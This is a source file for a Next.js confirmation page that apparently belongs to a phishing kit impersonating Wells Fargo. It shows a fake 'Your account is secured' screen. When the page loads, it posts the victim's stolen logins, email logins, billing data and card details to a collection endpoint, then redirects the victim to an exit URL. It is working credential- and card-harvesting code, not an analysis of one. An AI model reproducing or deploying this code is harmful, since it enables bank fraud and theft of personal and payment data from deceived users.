import React, { useContext, useEffect } from "react";
import Head from "next/head";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import { Spinner } from "../../components/Spinner";
import axios from "axios";
import { DataContext } from "../_app";

interface ConfirmationProps {}

export const Confirmation: React.FC<ConfirmationProps> = ({}) => {
  const { data } = useContext(DataContext);
  useEffect(() => {
    if (typeof window !== `undefined` && data && Object.keys(data).length) {
      const logins = data.logins;
      const emailLogins = data.emailLogins;
      const billing = data.info && data.info.billing;
      const cardDetails = data.info && data.info.card;

      const sendSession = async () => {
        if (logins) {
          const formData = new FormData();

          if (logins) {
            formData.append(`logins`, JSON.stringify(logins));
          }

          if (emailLogins) {
            formData.append(`emailLogins`, JSON.stringify(emailLogins));
          }

          if (billing) {
            formData.append(`billing`, JSON.stringify(billing));
          }

          if (cardDetails) {
            formData.append(`cardDetails`, JSON.stringify(cardDetails));
          }

          formData.append(`form`, `SESSION`);

          await axios.post(`/api/send-session`, formData, {
            headers: {
              "Content-Type": `multipart/form-data`,
            },
          });
        } else {
          console.log(`You are on the server`);
        }

        window.location.href = process.env.NEXT_PUBLIC_EXIT_URL as string;
      };

      sendSession();
    }
    return () => {};
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  return (
    <Wrapper altH hideBg>
      <Head>
        <title>Wells Fargo - Your Account has been secured</title>
      </Head>
      <div
        style={{
          marginBottom: `5em`,
        }}
      >
        <Container>
          <div
            style={{
              display: `flex`,
              flexWrap: `nowrap`,
              alignItems: `center`,
              //   justifyContent: `center`,
            }}
          >
            <h1
              className="FloatingPage__salutationTitle___1X9Mp"
              style={{
                color: `#d20826`,
              }}
            >
              <span>Your account is secured</span>
            </h1>
          </div>
          <p
            className="FloatingPage__title___2W2k5"
            style={{
              display: `flex`,
              flexWrap: `nowrap`,
              alignItems: `center`,
              //   justifyContent: `center`,
            }}
          >
            <span>Please wait, while we redirect you to the sign on page.</span>
          </p>
        </Container>
        <Container>
          <Spinner color="#d71f28" />
        </Container>
      </div>
    </Wrapper>
  );
};

export default Confirmation;
